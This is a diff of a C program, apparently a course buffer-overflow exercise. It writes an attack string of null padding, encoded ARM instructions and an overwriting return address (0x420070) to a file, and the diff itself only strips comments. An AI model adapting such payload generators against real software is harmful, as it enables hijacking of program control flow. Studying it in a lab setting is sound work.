@@ -7,7 +7,6 @@ int main(void)
 {
     const char* name = "Tansha Vugarwal";
     int i;
-    /* Need to change return address */
     unsigned long ulReturnAddress = 0x420070;
 
     /* putchar('A') */
@@ -36,19 +35,17 @@ int main(void)
         putc('\0', psFile); /* Writes 00000000 */
     }
 
-    /* 4->7 */
     fwrite(&uiMovInstr1, sizeof(unsigned int), 1, psFile);
-    /* 8->11 */
+
     fwrite(&uiBlInstr1, sizeof(unsigned int), 1, psFile);
-    /* 12->15 */
+
     fwrite(&uiMovInstr2, sizeof(unsigned int), 1, psFile);
-    /* 16->19 */
+
     fwrite(&uiAdrInstr, sizeof(unsigned int), 1, psFile);
-    /* 8->11 */
+
     fwrite(&uiStrbInstr, sizeof(unsigned int), 1, psFile);
-    /* 12->15 */
+
     fwrite(&uiBInstr, sizeof(unsigned int), 1, psFile);
-    /* 16->19 */
  
 
     fwrite(&ulReturnAddress, sizeof(unsigned long), 1, psFile);
